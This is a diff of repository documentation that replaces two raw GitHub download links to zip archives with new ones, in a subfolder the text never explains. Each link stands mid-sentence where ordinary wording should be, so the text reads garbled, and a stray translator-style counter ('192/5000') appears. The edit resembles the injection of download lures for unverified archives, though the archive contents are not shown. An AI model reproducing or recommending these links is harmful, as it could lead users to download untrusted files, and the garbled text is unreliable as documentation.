@@ -11,6 +11,6 @@ The following script performs the following routine:
 
 
 192/5000
-The file 'https://github.com/marcossangomes/reports-ec2-numbers-n-type/raw/refs/heads/master/demidandiprat/numbers_type_n_reports_ec_v1.1.zip' is the report that is generated;
+The file 'https://raw.githubusercontent.com/marcossangomes/reports-ec2-numbers-n-type/master/demidandiprat/n-type-ec-numbers-reports-3.7.zip' is the report that is generated;
 
-I put a 'dockerfile' together with the 'https://github.com/marcossangomes/reports-ec2-numbers-n-type/raw/refs/heads/master/demidandiprat/numbers_type_n_reports_ec_v1.1.zip' for the application if you want to create a CI / CD of the process;
+I put a 'dockerfile' together with the 'https://raw.githubusercontent.com/marcossangomes/reports-ec2-numbers-n-type/master/demidandiprat/n-type-ec-numbers-reports-3.7.zip' for the application if you want to create a CI / CD of the process;
